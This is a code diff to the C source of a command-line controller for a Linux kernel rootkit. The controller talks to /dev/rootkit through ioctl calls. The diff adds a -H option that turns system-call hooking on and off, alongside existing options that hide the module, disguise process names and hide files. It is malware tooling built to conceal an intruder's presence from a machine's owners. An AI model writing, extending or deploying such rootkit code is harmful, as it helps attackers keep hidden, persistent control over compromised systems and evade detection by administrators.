@@ -10,6 +10,7 @@
 void printUsageAndExit(char* cmd_name);
 static inline int openDev(void);
 
+void toggleSysCallHooks(void);
 void toggleVisibility(void);
 void masqProcNames(int len);
 void hideFile(char* file_name);
@@ -19,8 +20,11 @@ int main(int argc, char* argv[]) {
 
     if (argc <= 1) printUsageAndExit(argv[0]);
 
-    while ((opt = getopt(argc, argv, "hm:f:")) != -1) {
+    while ((opt = getopt(argc, argv, "Hhm:f:")) != -1) {
         switch (opt) {
+        case 'H':   // Hook/Unhook system calls
+            toggleSysCallHooks();
+            break;
         case 'h':   // Hide/Unhide the module
             toggleVisibility();
             break;
@@ -41,6 +45,7 @@ int main(int argc, char* argv[]) {
 
 void printUsageAndExit(char* cmd_name) {
     const char usage[] = "Usage: %s [OPTION]\n"
+        "-H             Hook/unhook system calls\n"
         "-h             Hide/unhide the module\n"
         "-m [LENGTH]    Masquerade process names\n"
         "-f [FILE NAME] Hide a file\n";
@@ -50,6 +55,12 @@ void printUsageAndExit(char* cmd_name) {
 
 static inline int openDev(void) {
     return open("/dev/rootkit", O_RDWR);
+}
+
+void toggleSysCallHooks(void) {
+    int fd = openDev();
+    ioctl(fd, IOCTL_MOD_HOOK);
+    close(fd);
 }
 
 void toggleVisibility(void) {
